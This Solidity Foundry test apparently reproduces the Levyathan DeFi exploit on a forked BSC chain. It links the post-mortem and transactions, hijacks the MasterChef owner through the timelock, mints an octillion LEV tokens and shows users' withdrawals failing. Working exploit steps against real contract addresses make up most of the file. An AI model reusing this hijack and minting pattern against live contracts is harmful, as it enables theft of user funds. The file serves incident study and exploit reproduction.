// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/*Key Information
The Levyathan developers left the private keys to a wallet with minting capability available on Github. -rekt

Attacker Address                     : 0x7507f84610f6d656a70eb8cdec044674799265d3
MasterChef(Vulnerable Contract)      : 0xA3fDF7F376F4BFD38D7C4A5cf8AAb4dE68792fd4
Initial Timelock Schedule Transaction: https://bscscan.com/address/0x7507f84610f6d656a70eb8cdec044674799265d3
Transaction was scheduled            : https://bscscan.com/tx/0xfd30def124c1345606598ae4817ae184fc1918fc638111c6e71bc9752361fd87
Transaction Executed                 : https://bscscan.com/tx/0xe6e504208ba90d121c3212a4f2547ae28e69790ab541d459c080ec8b1f3efab2
Post-Moderm                          : https://levyathan-index.medium.com/post-mortem-levyathan-c3ff7f9a6f65

POC-Written by                       :Sentient-X
twitter                              :@sentient_x

All thanks to the creator of this awesome repo

*/
contract ContractTest is Test {
    ILEV LEV = ILEV(0x304c62b5B030176F8d328d3A01FEaB632FC929BA);

    IMasterChef MasterChef = IMasterChef(0xA3fDF7F376F4BFD38D7C4A5cf8AAb4dE68792fd4);

    ITimelock Timelock = ITimelock(0x16149999C85c3E3f7d1B9402a4c64d125877d89D);
    address attacker = 0x7507f84610f6D656a70eb8CDEC044674799265D3;
    address Deployer = 0x6DeBA0F8aB4891632fB8d381B27eceC7f7743A14;

    address user1 = 0x160B6772c9976d21ddFB3e3211989Fa099451af7;
    address user2 = 0x2db0500e1942626944efB106D6A66755802Cef20;

    function setUp() public {
        vm.createSelectFork("bsc", 9_545_966); //fork bsc at block 9545967

        vm.label(address(MasterChef), "MasterChef");
        vm.label(address(LEV), "LEV");
        vm.label(address(Timelock), "Timelock");
        vm.label(address(Deployer), "Deployer");
    }

    function test_Timelock() public {
        bytes memory Ownership_hijack =
            (abi.encodePacked(bytes4(keccak256(bytes("transferOwnership(address)"))), abi.encode(address(attacker))));

        //Schedule a transaction from the Deployer current owner of timelock.
        vm.startPrank(address(Deployer));

        Timelock.schedule(
            address(MasterChef),
            0,
            Ownership_hijack,
            bytes32(0),
            bytes32(0xf6ee06c6a62a6a42d1ad9d321d45c4f92a7a215509c850ee36fb025ba767a764),
            172_800
        );

        //Validate that transaction is in timelock
        bytes32 txHash = Timelock.hashOperation(
            address(MasterChef),
            0,
            Ownership_hijack,
            bytes32(0),
            bytes32(0xf6ee06c6a62a6a42d1ad9d321d45c4f92a7a215509c850ee36fb025ba767a764)
        );

        assertTrue(Timelock.isOperationPending(txHash));

        vm.roll(9_600_775);
        vm.warp(block.timestamp + 172_800);

        //Execute transaction and validate state is updated
        Timelock.execute(
            address(MasterChef),
            0,
            Ownership_hijack,
            bytes32(0),
            bytes32(0xf6ee06c6a62a6a42d1ad9d321d45c4f92a7a215509c850ee36fb025ba767a764)
        );

        assertTrue(Timelock.isOperationDone(txHash));
        vm.stopPrank();

        //attacker address recovers LEV MasterChef Contract and mints 1 Octillion tokens
        vm.startPrank(address(attacker));
        MasterChef.recoverLevOwnership();
        LEV.mint(address(attacker), 100_000_000_000_000_000_000_000_000);
        vm.stopPrank();

        //Typical user1 tries to leave staking but gets revert error
        vm.expectRevert();
        vm.startPrank(address(user1));
        MasterChef.leaveStaking(10_000);

        //Same user1 tries to withdraw but gets another revert error
        vm.expectRevert();
        MasterChef.withdraw(3, 272_356_000_000_000_000_000_000);
        vm.stopPrank();

        //user2 does emergency withdraw and succeeds
        vm.startPrank(address(user2));
        MasterChef.emergencyWithdraw(4);
        vm.stopPrank();

        //user2 does another emergency withdraw and succeeds again.(Its actually user 3/4 that abused the emergencyWithdraw() vulnerability)
        vm.startPrank(address(user2));
        MasterChef.emergencyWithdraw(4);
        vm.stopPrank();
    }
}

interface ITimelock {
    function schedule(
        address target,
        uint256 value,
        bytes calldata data,
        bytes32 predecessor,
        bytes32 salt,
        uint256 delay
    ) external;
    function hashOperation(
        address target,
        uint256 value,
        bytes calldata data,
        bytes32 predecessor,
        bytes32 salt
    ) external returns (bytes32 hash);
    function isOperationPending(bytes32 id) external returns (bool pending);
    function execute(
        address target,
        uint256 value,
        bytes calldata payload,
        bytes32 predecessor,
        bytes32 salt
    ) external;
    function isOperationDone(bytes32 id) external returns (bool done);
}

interface ILEV {
    function mint(address receiver, uint256 amount) external;
}

interface IMasterChef {
    function recoverLevOwnership() external;
    function leaveStaking(uint256 _amount) external;
    function withdraw(uint256 _pid, uint256 _amount) external;
    function emergencyWithdraw(uint256 _pid) external;
}
